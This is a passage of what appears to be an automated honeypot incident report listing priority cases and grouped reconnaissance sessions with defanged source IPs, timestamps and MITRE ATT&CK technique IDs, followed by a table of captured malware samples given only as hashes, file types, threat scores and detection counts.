| IR-609667b02d3e | HIGH | `103.248.120[.]6` | 2026-10-14 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d53e1ee484d4 | HIGH | `184.105.247[.]195` | 2026-10-14 07:32 | Y | 3 | 0 | `T1078` |
| IR-346cc8b84a2d | HIGH | `107.150.105[.]116` | 2026-10-14 07:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cc1e08bb2fb1 | HIGH | `107.150.105[.]116` | 2026-10-14 07:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ca949ab1283 | HIGH | `220.243.133[.]81` | 2026-10-14 07:44 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-3fc246e89bb9 | HIGH | `187.16.96[.]250` | 2026-10-14 07:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-177558706549 | HIGH | `187.16.96[.]250` | 2026-10-14 07:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-662add679794 | HIGH | `23.29.118[.]81` | 2026-10-14 07:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e2ab23fba947 | HIGH | `23.29.118[.]81` | 2026-10-14 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-454ced70b7b8 | HIGH | `109.160.32[.]169` | 2026-10-14 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ab9fce102730 | HIGH | `128.1.32[.]150` | 2026-10-14 08:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-890e7c8121a8 | HIGH | `128.1.32[.]150` | 2026-10-14 08:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6881d8719a7d | HIGH | `141.95.54[.]130` | 2026-10-14 08:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-94cf9f680fd6 | HIGH | `141.95.54[.]130` | 2026-10-14 08:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f7f27ef8af3 | HIGH | `211.253.9[.]49` | 2026-10-14 08:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c5640541fe4 | HIGH | `211.253.9[.]49` | 2026-10-14 08:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d542fbad31f6 | HIGH | `102.88.137[.]213` | 2026-10-14 08:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-410fc60073fc | HIGH | `102.88.137[.]213` | 2026-10-14 08:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-537986a52b58 | HIGH | `176.53.159[.]196` | 2026-10-14 08:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a4c1bc1f6259 | HIGH | `150.5.141[.]198` | 2026-10-14 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-603bf71ca047 | HIGH | `150.5.141[.]198` | 2026-10-14 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-35e788cdcb16 | HIGH | `181.123.62[.]21` | 2026-10-14 09:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0373c5ef1e1f | HIGH | `181.123.62[.]21` | 2026-10-14 09:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8408bba8951 | HIGH | `164.30.17[.]82` | 2026-10-14 09:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0b1530f1f921 | HIGH | `103.189.208[.]13` | 2026-10-14 10:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c2969d69f3e5 | HIGH | `103.189.208[.]13` | 2026-10-14 10:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2554f4629232 | HIGH | `152.32.218[.]149` | 2026-10-14 10:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-33edc07e47b2 | HIGH | `152.32.218[.]149` | 2026-10-14 10:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c241d553d22 | HIGH | `105.28.108[.]165` | 2026-10-14 10:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c5ddd306b43a | HIGH | `105.28.108[.]165` | 2026-10-14 10:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-be7dffe55f07 | HIGH | `164.30.17[.]82` | 2026-10-14 10:18 | Y | 1 | 0 | `T1078 · T1592` |
| IR-cc82b023b53d | HIGH | `80.94.95[.]109` | 2026-10-14 10:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-aba65c0dd43c | HIGH | `4.224.59[.]75` | 2026-10-14 10:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-40495a7bdc06 | HIGH | `4.224.59[.]75` | 2026-10-14 10:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ab94807015d | HIGH | `36.189.207[.]159` | 2026-10-14 10:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-58f3613da756 | HIGH | `223.166.28[.]125` | 2026-10-14 10:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9ea35f313a82 | HIGH | `176.53.159[.]196` | 2026-10-14 10:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ad90b3b7b26 | HIGH | `185.242.226[.]73` | 2026-10-14 10:52 | Y | 3 | 0 | `T1078` |
| IR-93e849b286b4 | HIGH | `144.31.146[.]233` | 2026-10-14 10:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc1887db115b | HIGH | `144.31.146[.]233` | 2026-10-14 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6632952bea0 | HIGH | `41.93.28[.]23` | 2026-10-14 10:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cafe117534f7 | HIGH | `41.93.28[.]23` | 2026-10-14 10:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65d0d0638df9 | HIGH | `68.183.92[.]206` | 2026-10-14 11:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f340eb569871 | HIGH | `68.183.92[.]206` | 2026-10-14 11:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-75fe4c129055 | HIGH | `101.47.158[.]56` | 2026-10-14 11:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b0d1f6ecb2bb | HIGH | `101.47.158[.]56` | 2026-10-14 11:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55316386dab1 | HIGH | `46.188.119[.]26` | 2026-10-14 11:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fcae948adb8a | HIGH | `46.188.119[.]26` | 2026-10-14 11:14 | Y | 0 | 0 | `T1078 · T1592` |
_… 56 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `70.32.86[.]195` | **4** | 2026-10-14 01:41 | 2026-10-14 06:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-10-14 01:35 | 2026-10-14 04:35 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-10-14 07:37 | 2026-10-14 10:35 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-14 01:08 | 2026-10-14 04:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.167.180[.]10` | **2** | 2026-10-14 07:21 | 2026-10-14 08:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.15.140[.]235` | **2** | 2026-10-14 13:37 | 2026-10-14 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-14 10:16 | 2026-10-14 12:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.40.10[.]149` | **2** | 2026-10-14 05:13 | 2026-10-14 06:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]227` | **2** | 2026-10-14 03:54 | 2026-10-14 04:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-10-14 11:55 | 2026-10-14 12:02 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.156.209[.]236` | **2** | 2026-10-14 05:23 | 2026-10-14 06:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `59.29.146[.]19` | **2** | 2026-10-14 12:04 | 2026-10-14 14:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `61.72.67[.]87` | **2** | 2026-10-14 11:42 | 2026-10-14 12:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.53[.]14` | 1 | 2026-10-14 08:43 | 2026-10-14 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-10-14 02:03 | 2026-10-14 02:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-10-14 07:51 | 2026-10-14 07:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-14 07:15 | 2026-10-14 07:15 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.157.47[.]144` | 1 | 2026-10-14 05:09 | 2026-10-14 05:09 | 16s | 0 | `T1592` | 🟢 LOW |
| `104.157.47[.]144` | 1 | 2026-10-14 09:02 | 2026-10-14 09:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `104.250.184[.]10` | 1 | 2026-10-14 07:06 | 2026-10-14 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.250.184[.]60` | 1 | 2026-10-14 06:42 | 2026-10-14 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.250.184[.]70` | 1 | 2026-10-14 06:20 | 2026-10-14 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.75.254[.]120` | 1 | 2026-10-14 14:21 | 2026-10-14 14:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]102` | 1 | 2026-10-14 06:30 | 2026-10-14 06:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]107` | 1 | 2026-10-14 07:10 | 2026-10-14 07:11 | 7s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]133` | 1 | 2026-10-14 13:46 | 2026-10-14 13:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]146` | 1 | 2026-10-14 12:54 | 2026-10-14 12:54 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]169` | 1 | 2026-10-14 07:25 | 2026-10-14 07:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.164.146[.]173` | 1 | 2026-10-14 14:01 | 2026-10-14 14:02 | 20s | 0 | `T1592` | 🟢 LOW |
| `112.168.176[.]15` | 1 | 2026-10-14 11:28 | 2026-10-14 11:28 | 15s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-10-14 06:50 | 2026-10-14 06:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-10-14 07:20 | 2026-10-14 07:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-10-14 01:18 | 2026-10-14 01:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.177.172[.]64` | 1 | 2026-10-14 09:20 | 2026-10-14 09:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.49.193[.]202` | 1 | 2026-10-14 05:32 | 2026-10-14 05:32 | 19s | 0 | `T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-10-14 03:42 | 2026-10-14 03:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.119[.]108` | 1 | 2026-10-14 06:53 | 2026-10-14 06:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.199.176[.]30` | 1 | 2026-10-14 05:46 | 2026-10-14 05:47 | 26s | 0 | `T1592` | 🟢 LOW |
| `119.237.32[.]122` | 1 | 2026-10-14 01:24 | 2026-10-14 01:24 | 18s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]87` | 1 | 2026-10-14 06:53 | 2026-10-14 06:54 | 55s | 0 | `T1592` | 🟢 LOW |
| `120.26.240[.]78` | 1 | 2026-10-14 11:30 | 2026-10-14 11:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-10-14 06:51 | 2026-10-14 06:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.15.140[.]235` | 1 | 2026-10-14 10:11 | 2026-10-14 10:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.150.234[.]205` | 1 | 2026-10-14 06:12 | 2026-10-14 06:12 | 21s | 0 | `T1592` | 🟢 LOW |
| `121.162.14[.]55` | 1 | 2026-10-14 06:24 | 2026-10-14 06:25 | 22s | 0 | `T1592` | 🟢 LOW |
| `123.139.38[.]70` | 1 | 2026-10-14 02:58 | 2026-10-14 02:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.110.99[.]254` | 1 | 2026-10-14 07:30 | 2026-10-14 07:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `13.218.231[.]196` | 1 | 2026-10-14 01:42 | 2026-10-14 01:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-14 01:06 | 2026-10-14 01:07 | 54s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-14 07:35 | 2026-10-14 07:36 | 62s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-14 10:19 | 2026-10-14 10:20 | 57s | 0 | `T1592` | 🟢 LOW |
| `137.184.73[.]2` | 1 | 2026-10-14 01:45 | 2026-10-14 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-14 06:07 | 2026-10-14 06:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-14 08:13 | 2026-10-14 08:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-14 14:09 | 2026-10-14 14:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]62` | 1 | 2026-10-14 11:28 | 2026-10-14 11:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]221` | 1 | 2026-10-14 03:45 | 2026-10-14 03:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]186` | 1 | 2026-10-14 08:25 | 2026-10-14 08:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]189` | 1 | 2026-10-14 14:25 | 2026-10-14 14:25 | 21s | 0 | `T1592` | 🟢 LOW |
| `14.54.123[.]123` | 1 | 2026-10-14 08:31 | 2026-10-14 08:32 | 5s | 0 | `T1592` | 🟢 LOW |
| `150.107.38[.]40` | 1 | 2026-10-14 01:28 | 2026-10-14 01:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-10-14 04:01 | 2026-10-14 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.23.72[.]184` | 1 | 2026-10-14 04:25 | 2026-10-14 04:26 | 29s | 0 | `T1592` | 🟢 LOW |
| `157.230.134[.]132` | 1 | 2026-10-14 03:52 | 2026-10-14 03:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-10-14 01:30 | 2026-10-14 01:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.24[.]39` | 1 | 2026-10-14 07:34 | 2026-10-14 07:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | 1 | 2026-10-14 02:44 | 2026-10-14 02:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.225[.]15` | 1 | 2026-10-14 06:47 | 2026-10-14 06:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.37.155[.]35` | 1 | 2026-10-14 08:24 | 2026-10-14 08:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-14 10:45 | 2026-10-14 10:45 | 16s | 0 | `T1592` | 🟢 LOW |
| `178.236.132[.]185` | 1 | 2026-10-14 14:42 | 2026-10-14 14:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.74.109[.]190` | 1 | 2026-10-14 05:57 | 2026-10-14 05:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `179.4.41[.]3` | 1 | 2026-10-14 02:38 | 2026-10-14 02:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.253.205[.]236` | 1 | 2026-10-14 10:07 | 2026-10-14 10:07 | 28s | 0 | `T1592` | 🟢 LOW |
| `185.231.33[.]82` | 1 | 2026-10-14 13:26 | 2026-10-14 13:27 | 29s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]73` | 1 | 2026-10-14 10:53 | 2026-10-14 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.18[.]36` | 1 | 2026-10-14 12:33 | 2026-10-14 12:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `186.26.102[.]232` | 1 | 2026-10-14 06:38 | 2026-10-14 06:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-10-14 07:47 | 2026-10-14 07:47 | 1s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]5` | 1 | 2026-10-14 03:00 | 2026-10-14 03:00 | 14s | 0 | `T1592` | 🟢 LOW |
| `194.242.103[.]87` | 1 | 2026-10-14 08:55 | 2026-10-14 08:56 | 26s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-10-14 01:27 | 2026-10-14 01:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.165.159[.]25` | 1 | 2026-10-14 01:39 | 2026-10-14 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.187.189[.]66` | 1 | 2026-10-14 12:38 | 2026-10-14 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-10-14 02:26 | 2026-10-14 02:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]74` | 1 | 2026-10-14 04:16 | 2026-10-14 04:16 | 17s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.14.94[.]48` | 1 | 2026-10-14 05:55 | 2026-10-14 05:55 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.98.162[.]172` | 1 | 2026-10-14 02:37 | 2026-10-14 02:37 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.138.46[.]80` | 1 | 2026-10-14 12:53 | 2026-10-14 12:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.212.9[.]221` | 1 | 2026-10-14 09:31 | 2026-10-14 09:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.218.134[.]36` | 1 | 2026-10-14 03:10 | 2026-10-14 03:10 | 20s | 0 | `T1592` | 🟢 LOW |
| `206.183.111[.]36` | 1 | 2026-10-14 03:54 | 2026-10-14 03:55 | 58s | 0 | `T1592` | 🟢 LOW |
| `211.227.11[.]6` | 1 | 2026-10-14 04:42 | 2026-10-14 04:42 | 23s | 0 | `T1592` | 🟢 LOW |
| `211.227.11[.]6` | 1 | 2026-10-14 12:43 | 2026-10-14 12:43 | 21s | 0 | `T1592` | 🟢 LOW |
| `211.227.162[.]28` | 1 | 2026-10-14 14:49 | 2026-10-14 14:49 | 28s | 0 | `T1592` | 🟢 LOW |
| `211.251.11[.]198` | 1 | 2026-10-14 10:38 | 2026-10-14 10:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]62` | 1 | 2026-10-14 09:13 | 2026-10-14 09:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.66.98[.]55` | 1 | 2026-10-14 05:34 | 2026-10-14 05:35 | 20s | 0 | `T1592` | 🟢 LOW |
| `218.23.192[.]91` | 1 | 2026-10-14 06:23 | 2026-10-14 06:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.83.110[.]174` | 1 | 2026-10-14 01:56 | 2026-10-14 01:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `222.113.64[.]10` | 1 | 2026-10-14 07:35 | 2026-10-14 07:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.209.122[.]238` | 1 | 2026-10-14 09:37 | 2026-10-14 09:38 | 17s | 0 | `T1592` | 🟢 LOW |
| `223.83.183[.]254` | 1 | 2026-10-14 14:45 | 2026-10-14 14:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.93.164[.]218` | 1 | 2026-10-14 14:25 | 2026-10-14 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-14 05:23 | 2026-10-14 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]103` | 1 | 2026-10-14 12:53 | 2026-10-14 12:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.223.60[.]33` | 1 | 2026-10-14 02:19 | 2026-10-14 02:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.14.1[.]97` | 1 | 2026-10-14 04:56 | 2026-10-14 04:56 | 6s | 0 | `T1592` | 🟢 LOW |
| `34.156.109[.]112` | 1 | 2026-10-14 04:56 | 2026-10-14 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.241.161[.]1` | 1 | 2026-10-14 04:49 | 2026-10-14 04:50 | 7s | 0 | `T1592` | 🟢 LOW |
| `36.189.207[.]159` | 1 | 2026-10-14 10:32 | 2026-10-14 10:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.191.236[.]30` | 1 | 2026-10-14 12:17 | 2026-10-14 12:17 | 13s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]253` | 1 | 2026-10-14 11:59 | 2026-10-14 12:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.124.176[.]147` | 1 | 2026-10-14 10:08 | 2026-10-14 10:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-14 10:06 | 2026-10-14 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-14 13:04 | 2026-10-14 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-14 01:06 | 2026-10-14 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-14 04:04 | 2026-10-14 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]172` | 1 | 2026-10-14 02:43 | 2026-10-14 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]174` | 1 | 2026-10-14 02:43 | 2026-10-14 02:43 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]175` | 1 | 2026-10-14 02:43 | 2026-10-14 02:43 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-14 02:43 | 2026-10-14 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-14 05:44 | 2026-10-14 05:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-14 08:36 | 2026-10-14 08:37 | 7s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-10-14 01:40 | 2026-10-14 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.232.224[.]216` | 1 | 2026-10-14 11:31 | 2026-10-14 11:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `47.236.165[.]237` | 1 | 2026-10-14 04:15 | 2026-10-14 04:15 | 32s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-10-14 11:16 | 2026-10-14 11:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.153.69[.]64` | 1 | 2026-10-14 03:09 | 2026-10-14 03:09 | 29s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-10-14 12:34 | 2026-10-14 12:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.23.126[.]178` | 1 | 2026-10-14 14:46 | 2026-10-14 14:46 | 29s | 0 | `T1592` | 🟢 LOW |
| `59.29.146[.]19` | 1 | 2026-10-14 10:04 | 2026-10-14 10:04 | 24s | 0 | `T1592` | 🟢 LOW |
| `59.7.131[.]145` | 1 | 2026-10-14 03:46 | 2026-10-14 03:47 | 26s | 0 | `T1592` | 🟢 LOW |
| `61.244.37[.]196` | 1 | 2026-10-14 14:43 | 2026-10-14 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.73.49[.]174` | 1 | 2026-10-14 06:26 | 2026-10-14 06:26 | 22s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-10-14 05:54 | 2026-10-14 05:54 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]183` | 1 | 2026-10-14 04:41 | 2026-10-14 04:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-14 10:17 | 2026-10-14 10:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]132` | 1 | 2026-10-14 09:31 | 2026-10-14 09:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]36` | 1 | 2026-10-14 06:38 | 2026-10-14 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]47` | 1 | 2026-10-14 01:33 | 2026-10-14 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]119` | 1 | 2026-10-14 06:58 | 2026-10-14 06:58 | 3s | 0 | `T1592` | 🟢 LOW |
| `70.32.86[.]195` | 1 | 2026-10-14 08:38 | 2026-10-14 08:39 | 31s | 0 | `T1592` | 🟢 LOW |
| `73.102.132[.]190` | 1 | 2026-10-14 02:44 | 2026-10-14 02:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.212.245[.]193` | 1 | 2026-10-14 05:50 | 2026-10-14 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-14 07:41 | 2026-10-14 07:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-14 11:03 | 2026-10-14 11:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-10-14 03:52 | 2026-10-14 03:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.183.23[.]203` | 1 | 2026-10-14 03:04 | 2026-10-14 03:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.152.99[.]77` | 1 | 2026-10-14 05:45 | 2026-10-14 05:46 | 48s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]13` | 1 | 2026-10-14 14:32 | 2026-10-14 14:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]12` | 1 | 2026-10-14 11:55 | 2026-10-14 11:55 | 31s | 0 | `T1592` | 🟢 LOW |
| `9.139.208[.]235` | 1 | 2026-10-14 10:07 | 2026-10-14 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.113.208[.]17` | 1 | 2026-10-14 14:35 | 2026-10-14 14:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.213.33[.]119` | 1 | 2026-10-14 05:48 | 2026-10-14 05:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.225.111[.]30` | 1 | 2026-10-14 14:28 | 2026-10-14 14:29 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
